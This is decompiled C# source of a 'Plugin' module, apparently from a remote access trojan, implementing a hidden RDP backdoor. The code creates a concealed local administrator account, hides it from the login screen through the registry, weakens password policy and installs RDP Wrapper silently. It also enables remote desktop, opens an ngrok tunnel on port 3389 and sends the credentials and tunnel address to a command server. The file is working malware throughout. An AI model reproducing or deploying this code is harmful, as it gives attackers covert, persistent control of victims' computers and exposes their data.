using System;
using System.Collections;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Plugin.My.Resources;

namespace Plugin
{
	// Token: 0x0200000C RID: 12
	[StandardModule]
	internal sealed class Helper
	{
		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000020 RID: 32 RVA: 0x00002A3E File Offset: 0x00000C3E
		// (set) Token: 0x06000021 RID: 33 RVA: 0x00002A47 File Offset: 0x00000C47
		public static Process MyProcess { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x06000022 RID: 34 RVA: 0x00002A50 File Offset: 0x00000C50
		public static object HRDPFunc(string User, string Pass)
		{
			bool flag = !Helper.UAC();
			checked
			{
				object result;
				if (flag)
				{
					Helper.SendError("Error please check administrator permissions!");
				}
				else
				{
					bool flag2 = !File.Exists(Helper.NGROK);
					if (flag2)
					{
						Helper.SendError("Error ngrok not found please use ngrok installer first!");
					}
					else
					{
						Helper.SendMsg("Hidden RDP..");
						bool flag3 = Helper.MyProcess != null;
						if (flag3)
						{
							try
							{
								Helper.MyProcess.Kill();
							}
							catch (Exception ex)
							{
							}
						}
						try
						{
							DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
							DirectoryEntry directoryEntry2 = directoryEntry.Children.Add(User, "user");
							directoryEntry2.Invoke("SetPassword", new object[]
							{
								Pass
							});
							directoryEntry2.CommitChanges();
							DirectoryEntry directoryEntry3 = directoryEntry.Children.Find("Administrators", "group");
							bool flag4 = directoryEntry3 != null;
							bool flag5 = flag4;
							if (flag5)
							{
								directoryEntry3.Invoke("Add", new object[]
								{
									directoryEntry2.Path.ToString()
								});
							}
							Debug.WriteLine("Account Created Successfully");
						}
						catch (Exception ex2)
						{
							Debug.WriteLine(ex2.Message);
						}
						try
						{
							bool is64BitOperatingSystem = Environment.Is64BitOperatingSystem;
							bool flag6 = is64BitOperatingSystem;
							if (flag6)
							{
								N n = new N();
								n.OpenSubKey(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true, N.RegWow64Options.KEY_WOW64_64KEY).SetValue(User, 0, RegistryValueKind.DWord);
							}
							else
							{
								Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true).SetValue(User, 0, RegistryValueKind.DWord);
							}
						}
						catch (Exception ex3)
						{
							Debug.WriteLine(ex3.Message);
						}
						try
						{
							RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", true);
							registryKey.SetValue("LimitBlankPasswordUse", 0, RegistryValueKind.DWord);
							registryKey.Close();
						}
						catch (Exception ex4)
						{
							Debug.WriteLine(ex4.Message);
						}
						try
						{
							bool flag7 = !File.Exists(Helper.RDPWInst);
							if (flag7)
							{
								File.WriteAllBytes(Helper.RDPWInst, Resources.RDPWInst);
							}
						}
						catch (Exception ex5)
						{
							Debug.WriteLine(ex5.Message);
						}
						try
						{
							bool flag8 = !Directory.Exists(Helper.INFile);
							if (flag8)
							{
								Directory.CreateDirectory(Helper.INFile);
							}
							File.WriteAllText(Helper.INFile + "\\rdpwrap.ini", Resources.rdpwrap);
						}
						catch (Exception ex6)
						{
							Debug.WriteLine(ex6.Message);
						}
						try
						{
							FileStream fileStream = new FileStream(Helper.INFile + "\\rdpwrap.ini", FileMode.Open);
							Process.Start(new ProcessStartInfo
							{
								FileName = Helper.RDPWInst,
								Arguments = "-i",
								WindowStyle = ProcessWindowStyle.Hidden
							}).WaitForExit();
							fileStream.Close();
						}
						catch (Exception ex7)
						{
							Debug.WriteLine(ex7.Message);
						}
						try
						{
							RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
							registryKey2.SetValue("fDenyTSConnections", 0, RegistryValueKind.DWord);
							registryKey2.Close();
						}
						catch (Exception ex8)
						{
							Debug.WriteLine(ex8.Message);
						}
						try
						{
							Helper.MyProcess = new Process();
							ProcessStartInfo startInfo = Helper.MyProcess.StartInfo;
							startInfo.FileName = Helper.NGROK;
							startInfo.Arguments = "tcp 3389";
							startInfo.WindowStyle = ProcessWindowStyle.Hidden;
							startInfo.CreateNoWindow = true;
							Helper.MyProcess.Start();
						}
						catch (Exception ex9)
						{
							Debug.WriteLine(ex9.Message);
						}
						int num = 1;
						string text;
						for (;;)
						{
							bool flag9 = Helper.MyProcess == null;
							if (flag9)
							{
								break;
							}
							Thread.Sleep(3000);
							text = Helper.API();
							bool flag10 = text.Contains("N/A") | string.IsNullOrEmpty(text);
							if (!flag10)
							{
								goto IL_42E;
							}
							num++;
							if (num > 5)
							{
								goto IL_43D;
							}
						}
						return result;
						IL_42E:
						IL_43D:
						bool flag11 = text.Contains("N/A") | string.IsNullOrEmpty(text);
						if (flag11)
						{
							Helper.SendError("Ngrok connection not started");
						}
						else
						{
							ClientSocket.Send(string.Concat(new string[]
							{
								"hrdp+",
								Settings.SPL,
								Settings.IDD,
								Settings.SPL,
								User,
								Settings.SPL,
								Pass,
								Settings.SPL,
								text
							}));
						}
					}
				}
				return result;
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002F84 File Offset: 0x00001184
		public static string API()
		{
			string text = string.Empty;
			string result = text;
			checked
			{
				try
				{
					using (Stream stream = new WebClient().OpenRead("http://127.0.0.1:4040/api/tunnels"))
					{
						using (StreamReader streamReader = new StreamReader(stream))
						{
							string input = streamReader.ReadToEnd();
							string pattern = "((tcp?|http?|tcp|http):((//)|(\\\\\\\\))+[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)";
							MatchCollection matchCollection = Regex.Matches(input, pattern);
							try
							{
								foreach (object obj in matchCollection)
								{
									object objectValue = RuntimeHelpers.GetObjectValue(obj);
									string text2 = "tcp://";
									string text3 = Convert.ToString(RuntimeHelpers.GetObjectValue(objectValue));
									text = text3.Substring(text3.IndexOf(text2) + text2.Length);
								}
							}
							finally
							{
								IEnumerator enumerator;
								if (enumerator is IDisposable)
								{
									(enumerator as IDisposable).Dispose();
								}
							}
							try
							{
								foreach (object obj2 in matchCollection)
								{
									object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
									string text4 = "http://";
									string text5 = Convert.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
									text = text5.Substring(text5.IndexOf(text4) + text4.Length);
								}
							}
							finally
							{
								IEnumerator enumerator2;
								if (enumerator2 is IDisposable)
								{
									(enumerator2 as IDisposable).Dispose();
								}
							}
						}
					}
					return (!string.IsNullOrEmpty(text)) ? text : "N/A";
				}
				catch (Exception ex)
				{
				}
				return result;
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003170 File Offset: 0x00001370
		public static bool UAC()
		{
			bool result;
			try
			{
				result = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000031B8 File Offset: 0x000013B8
		public static object SendError(string msg)
		{
			try
			{
				ClientSocket.Send(string.Concat(new string[]
				{
					"hrdpErr",
					Settings.SPL,
					Settings.IDD,
					Settings.SPL,
					msg
				}));
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			object result;
			return result;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x0000322C File Offset: 0x0000142C
		public static object SendMsg(string msg)
		{
			try
			{
				ClientSocket.Send(string.Concat(new string[]
				{
					"hrdpMSG",
					Settings.SPL,
					Settings.IDD,
					Settings.SPL,
					msg
				}));
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			object result;
			return result;
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000032A0 File Offset: 0x000014A0
		public static byte[] SB(string s)
		{
			return Encoding.UTF8.GetBytes(s);
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000032C0 File Offset: 0x000014C0
		public static string BS(byte[] b)
		{
			return Encoding.UTF8.GetString(b);
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000032E0 File Offset: 0x000014E0
		public static byte[] AES_Encryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return result;
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00003364 File Offset: 0x00001564
		public static byte[] AES_Decryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return result;
		}

		// Token: 0x04000015 RID: 21
		public static readonly string Temp = Interaction.Environ("Temp");

		// Token: 0x04000016 RID: 22
		public static readonly string NGROK = Helper.Temp + "\\ngrok.exe";

		// Token: 0x04000017 RID: 23
		public static readonly string RDPWInst = Helper.Temp + "\\RDPWInst.exe";

		// Token: 0x04000018 RID: 24
		public static readonly string INFile = "C:\\Program Files\\RDP Wrapper";
	}
}
